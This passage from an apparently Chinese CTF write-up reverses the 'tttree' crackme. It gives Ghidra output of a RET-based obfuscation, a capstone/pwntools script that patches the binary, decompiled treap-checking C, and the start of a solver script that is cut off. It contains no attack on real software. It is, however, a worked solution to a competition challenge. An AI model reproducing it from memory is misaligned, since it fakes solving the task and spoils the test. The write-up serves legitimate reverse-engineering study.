class="line">time.sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
<p>其实本质是一个TEA（包括魔数都一样了），直接写出TEA解密算法即可</p>
<h2><span id="tttree">tttree</span><a href="#tttree" class="header-anchor"></a></h2><p>在ghidra中打开二进制文件，看到入口函数非常小，没有调用自身以外的东西</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">longlong __fastcall entry(void)</span><br><span class="line">             longlong          RAX:8               &lt;RETURN&gt;</span><br><span class="line">             undefined8        Stack[-0x30]:8      local_30                                XREF[1]:     1400133ce(W)  </span><br><span class="line">                             entry                                           XREF[2]:     Entry Point(*), 140000120(*)  </span><br><span class="line">         1400133b7 52              PUSH         RDX</span><br><span class="line">         1400133b8 5a              POP          RDX</span><br><span class="line">         1400133b9 51              PUSH         RCX</span><br><span class="line">         1400133ba 59              POP          RCX</span><br><span class="line">         1400133bb 48 83 ec 28     SUB          RSP,0x28</span><br><span class="line">         1400133bf 50              PUSH         RAX</span><br><span class="line">         1400133c0 50              PUSH         RAX</span><br><span class="line">         1400133c1 9c              PUSHFQ</span><br><span class="line">         1400133c2 e8 00 00        CALL         LAB_1400133c7</span><br><span class="line">                   00 00</span><br><span class="line">                             LAB_1400133c7                                   XREF[1]:     1400133c2(j)  </span><br><span class="line">         1400133c7 58              POP          RAX</span><br><span class="line">         1400133c8 48 05 1b        ADD          RAX,0x191b</span><br><span class="line">                   19 00 00</span><br><span class="line">         1400133ce 48 89 44        MOV          qword ptr [RSP + 0x10]=&gt;local_30,RAX=&gt;FUN_1400</span><br><span class="line">                   24 10</span><br><span class="line">         1400133d3 9d              POPFD</span><br><span class="line">         1400133d4 58              POP          RAX</span><br><span class="line">         1400133d5 c3              RET</span><br></pre></td></tr></table></figure>

<p>用RET代替跳转和调用。所以它是面向返回的编程，但又有所不同 :D<br>RET将跳转的地址用mov <code>[rsp+0x10]</code>, rax写入，而rax则用pop rax设置；add rax $x<br>这个pop rax将弹出前一条指令中的调用所推送的返回地址。</p>
<p>所以这整个模式基本上等同于把rip相对地址推到堆栈中（rax和flags将被恢复）最后RET将跳转到它。<br>pushfq和popfd的使用可能是为了使混淆不会扰乱x86的标志。<br>不过好在，基本上都是这种模式，所以我写了一个去混淆的脚本，用python-capstone、pefile和pwn.asm来修补二进制。<br>有两种情况。<br>①:把rip的相对地址推到堆栈，然后RET -&gt;相当于JMP<br>②:推送两个rip相对地址到堆栈，然后RET -&gt;我把这解释为如果CALL发生在第二个推送的值上，而调用所推送的返回地址是第一个推送值。<br>所以我把这个模式大致变成了CALL $second和JMP $first。<br>不过pwn得asm真的特别慢<br>Patch exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone.x86 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">pwn.context.arch = <span class="string">&#x27;amd64&#x27;</span> <span class="comment"># Default architecture is i386</span></span><br><span class="line"></span><br><span class="line">md.detail = <span class="literal">True</span></span><br><span class="line"><span class="comment"># for reference</span></span><br><span class="line"><span class="comment"># &lt;CsInsn 0x0 [50]: push rax&gt;</span></span><br><span class="line"><span class="comment"># &lt;CsInsn 0x1 [50]: push rax&gt;</span></span><br><span class="line"><span class="comment"># &lt;CsInsn 0x2 [9c]: pushfq &gt;</span></span><br><span class="line"><span class="comment"># &lt;CsInsn 0x3 [e800000000]: call 8&gt;</span></span><br><span class="line"><span class="comment"># &lt;CsInsn 0x8 [58]: pop rax&gt;</span></span><br><span class="line"><span class="comment"># &lt;CsInsn 0x9 [480559d7ffff]: add rax, -0x28a7&gt;</span></span><br><span class="line"><span class="comment"># &lt;CsInsn 0xf [4889442410]: mov qword ptr [rsp + 0x10], rax&gt;</span></span><br><span class="line"><span class="comment"># &lt;CsInsn 0x14 [9d]: popfq &gt;</span></span><br><span class="line"><span class="comment"># &lt;CsInsn 0x15 [58]: pop rax&gt;</span></span><br><span class="line"><span class="comment"># &lt;CsInsn 0x16 [50]: push rax&gt;</span></span><br><span class="line"><span class="comment"># &lt;CsInsn 0x17 [50]: push rax&gt;</span></span><br><span class="line"><span class="comment"># &lt;CsInsn 0x18 [9c]: pushfq &gt;</span></span><br><span class="line"><span class="comment"># &lt;CsInsn 0x19 [e800000000]: call 0x1e&gt;</span></span><br><span class="line"><span class="comment"># &lt;CsInsn 0x1e [58]: pop rax&gt;</span></span><br><span class="line"><span class="comment"># &lt;CsInsn 0x1f [48050781ffff]: add rax, -0x7ef9&gt;</span></span><br><span class="line"><span class="comment"># &lt;CsInsn 0x25 [4889442410]: mov qword ptr [rsp + 0x10], rax&gt;</span></span><br><span class="line"><span class="comment"># &lt;CsInsn 0x2a [9d]: popfq &gt;</span></span><br><span class="line"><span class="comment"># &lt;CsInsn 0x2b [58]: pop rax&gt;</span></span><br><span class="line"><span class="comment"># &lt;CsInsn 0x2c [c3]: ret &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch</span>(<span class="params">chunk: <span class="built_in">bytearray</span></span>) -&gt; <span class="built_in">bytearray</span>:</span><br><span class="line">    pattern = <span class="string">b&#x27;\x50\x50\x9c&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chunk)):</span><br><span class="line">        <span class="keyword">if</span> chunk[off:off+<span class="built_in">len</span>(pattern)] == pattern:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(off))</span><br><span class="line">            <span class="comment"># print(chunk[off:off+16])</span></span><br><span class="line">            inss = md.disasm(chunk[off:off+<span class="number">0x40</span>], <span class="number">0</span>)</span><br><span class="line">            <span class="comment"># print(inss)</span></span><br><span class="line">            adr_v = []</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> inss:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                <span class="comment"># print(i.address)</span></span><br><span class="line">                <span class="keyword">if</span> i.mnemonic == <span class="string">&#x27;add&#x27;</span>:</span><br><span class="line">                    <span class="keyword">assert</span> i.address <span class="keyword">in</span> [<span class="number">0x9</span>, <span class="number">0x1f</span>]</span><br><span class="line">                    <span class="keyword">assert</span> i.mnemonic == <span class="string">&#x27;add&#x27;</span></span><br><span class="line">                    adr_v.append(i.operands[<span class="number">1</span>].value.imm)</span><br><span class="line">                    <span class="comment"># print(hex(add_v))</span></span><br><span class="line">                <span class="keyword">if</span> i.address == <span class="number">0x16</span>:</span><br><span class="line">                    <span class="keyword">if</span> i.mnemonic == <span class="string">&#x27;ret&#x27;</span>:</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">assert</span> <span class="built_in">len</span>(adr_v)&gt;<span class="number">0</span></span><br><span class="line">                        target = adr_v[<span class="number">0</span>] + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment"># print(hex(target+off))</span></span><br><span class="line">                        n = i.address+i.size</span><br><span class="line">                        chunk[off:off+n] = <span class="string">b&#x27;\x90&#x27;</span>*n</span><br><span class="line"></span><br><span class="line">                        <span class="comment"># print(pwn.p32(target), jins)</span></span><br><span class="line"></span><br><span class="line">                        jins = pwn.asm(<span class="string">f&#x27;jmp $+<span class="subst">&#123;target&#125;</span>&#x27;</span>)</span><br><span class="line">                        chunk[off:off+<span class="built_in">len</span>(jins)]=jins</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">assert</span> chunk[off+<span class="number">0x16</span>:off+<span class="number">0x16</span>+<span class="built_in">len</span>(pattern)] == pattern</span><br><span class="line">                <span class="keyword">if</span> i.address == <span class="number">0x16</span>*<span class="number">2</span>:</span><br><span class="line">                    <span class="built_in">print</span>(adr_v)</span><br><span class="line">                    <span class="keyword">assert</span> i.mnemonic == <span class="string">&#x27;ret&#x27;</span></span><br><span class="line">                    <span class="keyword">assert</span> <span class="built_in">len</span>(adr_v)&gt;<span class="number">1</span></span><br><span class="line">                    call_target = adr_v[<span class="number">1</span>] + <span class="number">0x1e</span></span><br><span class="line">                    jmp_target = adr_v[<span class="number">0</span>] + <span class="number">8</span></span><br><span class="line">                    shc = pwn.asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                            call $+<span class="subst">&#123;call_target&#125;</span></span></span><br><span class="line"><span class="string">                            &#x27;&#x27;&#x27;</span>)</span><br><span class="line">                    shj = pwn.asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                            jmp $+<span class="subst">&#123;jmp_target-<span class="built_in">len</span>(shc)&#125;</span></span></span><br><span class="line"><span class="string">                            &#x27;&#x27;&#x27;</span>)</span><br><span class="line">                    n = i.address+i.size</span><br><span class="line">                    chunk[off:off+n] = <span class="string">b&#x27;\x90&#x27;</span>*n</span><br><span class="line"></span><br><span class="line">                    jins = shc + shj</span><br><span class="line">                    chunk[off:off+<span class="built_in">len</span>(jins)]=jins</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> chunk</span><br><span class="line"></span><br><span class="line">pe = pefile.PE(<span class="string">&quot;tttree2.exe&quot;</span>)</span><br><span class="line">c = <span class="built_in">bytearray</span>(<span class="built_in">open</span>(<span class="string">&#x27;tttree2.exe&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> pe.sections:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (s.IMAGE_SCN_MEM_EXECUTE): <span class="comment"># only patch executable regions</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    l = s.PointerToRawData</span><br><span class="line">    r = l + s.SizeOfRawData</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;offs:&#x27;</span>, <span class="built_in">hex</span>(l), <span class="built_in">hex</span>(r))</span><br><span class="line">    c[l:r] = patch(c[l:r])</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;patched.exe&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(c)</span><br></pre></td></tr></table></figure>
<p>之后就得到了patch之后的程序 但是仍然不够完全 但是ghidra这个反汇编工具很强大，完全可以反编译<br>所以我们得到主要程序逻辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">rng</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  cur_rng = (<span class="type">int</span>)(((longlong)cur_rng * <span class="number">0xbc8f</span>) % <span class="number">0x7fffffff</span>);</span><br><span class="line">  <span class="keyword">return</span> cur_rng;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(<span class="type">int</span> *idx,<span class="type">int</span> v)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> rnd;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (*idx == <span class="number">0</span>) &#123;</span><br><span class="line">    node_cnt = node_cnt + <span class="number">1</span>;</span><br><span class="line">    *idx = node_cnt;</span><br><span class="line">    nodes[*idx].cnt = <span class="number">1</span>;</span><br><span class="line">    nodes[*idx].size = <span class="number">1</span>;</span><br><span class="line">    nodes[*idx].value = v;</span><br><span class="line">    nodes[*idx].some_data = (<span class="type">int</span>)flag_input[*idx + <span class="number">6</span>];</span><br><span class="line">    rnd = rng();</span><br><span class="line">    arr[arr_idx] = rnd;</span><br><span class="line">    nodes[*idx].priority = arr[arr_idx];</span><br><span class="line">    arr_idx = arr_idx + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    nodes[*idx].size = nodes[*idx].size + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (nodes[*idx].value == v) &#123;</span><br><span class="line">      nodes[*idx].cnt = nodes[*idx].cnt + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (nodes[*idx].value &lt; v) &#123;</span><br><span class="line">      insert(&amp;nodes[*idx].R,v);</span><br><span class="line">      <span class="keyword">if</span> (nodes[nodes[*idx].R].priority &lt; nodes[*idx].priority) &#123;</span><br><span class="line">        rot_somehow(idx);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      insert(&amp;nodes[*idx].L,v);</span><br><span class="line">      <span class="keyword">if</span> (nodes[nodes[*idx].L].priority &lt; nodes[*idx].priority) &#123;</span><br><span class="line">        rot_otherhow(idx);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> * <span class="title function_">check</span><span class="params">(<span class="type">int</span> *idx)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  longlong cur_node_idx;</span><br><span class="line">  <span class="type">int</span> idx_cp;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (*idx != <span class="number">0</span>) &#123;</span><br><span class="line">    check(&amp;nodes[*idx].L);</span><br><span class="line">    check(&amp;nodes[*idx].R);</span><br><span class="line">    <span class="keyword">if</span> ((nodes[*idx].L != <span class="number">0</span>) &amp;&amp;</span><br><span class="line">       (target_l[node_idx_ctr] != (longlong)(nodes[*idx].L * <span class="number">23</span> + nodes[*idx].some_data))) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((nodes[*idx].R != <span class="number">0</span>) &amp;&amp;</span><br><span class="line">       (target_r[node_idx_ctr] != (longlong)(nodes[*idx].R * <span class="number">23</span> + nodes[*idx].some_data))) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    idx_cp = *idx;</span><br><span class="line">    cur_node_idx = (longlong)node_idx_ctr;</span><br><span class="line">    node_idx_ctr = node_idx_ctr + <span class="number">1</span>;</span><br><span class="line">    idx = (<span class="type">int</span> *)(ulonglong)(uint)int_targets[cur_node_idx];</span><br><span class="line">    <span class="keyword">if</span> (nodes[idx_cp].value != int_targets[cur_node_idx]) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> idx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">undefined8 <span class="title function_">main_really</span><span class="params">(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  longlong lVar1;</span><br><span class="line">  longlong lVar2;</span><br><span class="line">  <span class="type">int</span> rnd;</span><br><span class="line">  uint _Seed;</span><br><span class="line">  <span class="type">char</span> *tmp;</span><br><span class="line">  <span class="type">int</span> i_1;</span><br><span class="line">  <span class="type">int</span> j;</span><br><span class="line">  longlong i;</span><br><span class="line">  uint flag_on_stack [<span class="number">100</span>];</span><br><span class="line">  undefined8 uStack8;</span><br><span class="line">  </span><br><span class="line">  uStack8 = param_1;</span><br><span class="line">  _Seed = seed((<span class="type">__time64_t</span> *)<span class="number">0x0</span>);</span><br><span class="line">  srand(_Seed);</span><br><span class="line">  print(<span class="string">&quot;flag:&quot;</span>,param_2,param_3,param_4);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,flag_input,param_3,param_4);</span><br><span class="line">  <span class="keyword">for</span> (i_1 = <span class="number">0</span>; i_1 &lt; <span class="number">32</span>; i_1 = i_1 + <span class="number">1</span>) &#123;</span><br><span class="line">    rnd = rng();</span><br><span class="line">    flag_on_stack[i_1] = (<span class="type">int</span>)((longlong)rnd % <span class="number">107</span>) + <span class="number">97</span> + (<span class="type">int</span>)flag_input[i_1 + <span class="number">7</span>] + i_1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (((((flag_input[<span class="number">0</span>] != <span class="string">&#x27;S&#x27;</span>) &amp;&amp; (flag_input[<span class="number">1</span>] != <span class="string">&#x27;U&#x27;</span>)) &amp;&amp; (flag_input[<span class="number">2</span>] != <span class="string">&#x27;S&#x27;</span>)) &amp;&amp;</span><br><span class="line">      ((flag_input[<span class="number">3</span>] != <span class="string">&#x27;C&#x27;</span> &amp;&amp; (flag_input[<span class="number">4</span>] != <span class="string">&#x27;T&#x27;</span>)))) &amp;&amp;</span><br><span class="line">     ((flag_input[<span class="number">5</span>] != <span class="string">&#x27;F&#x27;</span> &amp;&amp; ((flag_input[<span class="number">6</span>] != <span class="string">&#x27;&#123;&#x27;</span> &amp;&amp; (flag_input[<span class="number">39</span>] != <span class="string">&#x27;&#125;&#x27;</span>)))))) &#123;</span><br><span class="line">    print(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// length check here</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j = j + <span class="number">1</span>) &#123;</span><br><span class="line">    insert(&amp;root,flag_on_stack[j]);</span><br><span class="line">  &#125;</span><br><span class="line">  check(&amp;root);</span><br><span class="line">  print(<span class="string">&quot;\nYES\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>逆向主要是有两种类型的判断<br>1.如果我们知道哪个cur_node_idx(后序遍历索引)对应哪个idx，那么我们可以通过从int_targets[cur_node_idx]中减去(rng()%107 + 97 + idx)来找到idx处的标志字符。<br>2.当我们知道该节点的字符时，我们可以用check_l和check_r找到子节点的索引。但是，当节点的两边都没有孩子的时候，这就有点棘手。<br> 如果check_x[cur_node_idx]在23以上的残差与字符不一样，那么我们肯定知道它没有以这种方式出现的孩子否则我以为它是指有孩子<br>然后只能慢慢手动修复<br>有了这个想法之后 就可以慢慢递归的去解决他了 但是我们还是不能够丢掉第一个节点<br>所以我们可以通过他们的节点的优先级来获取 而且由于Treaps的特性，我们知道根节点将有最小的优先级。结果是idx&#x3D;4<br>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> icecream <span class="keyword">import</span> ic</span><br><span class="line">lrbuf = [ <span class="number">0xa8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x9e</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3a</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xbf</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x92</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xf0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x74</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xc3</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x89</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span 